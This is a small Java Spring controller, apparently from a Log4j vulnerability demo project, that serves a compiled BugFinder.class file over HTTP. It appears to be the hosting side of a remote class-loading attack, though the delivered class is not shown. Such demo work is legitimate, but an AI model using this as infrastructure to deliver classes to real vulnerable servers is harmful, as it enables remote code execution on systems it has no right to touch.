package com.transfar.test;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletResponse;
import java.io.FileInputStream;
import java.io.OutputStream;

@RestController
public class ClassController {

    @GetMapping(value = "/BugFinder.class")
    public void getClass(HttpServletResponse response) {
        String file = "/Users/chenke/code/pf/log4jdemo/target/classes/com/transfar/test/BugFinder.class";
        FileInputStream inputStream = null;
        OutputStream os = null;
        try {
            inputStream = new FileInputStream(file);
            byte[] data = new byte[inputStream.available()];
            inputStream.read(data);
            os = response.getOutputStream();
            os.write(data);
            os.flush();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // 省略流的判断关闭；
        }
    }
}
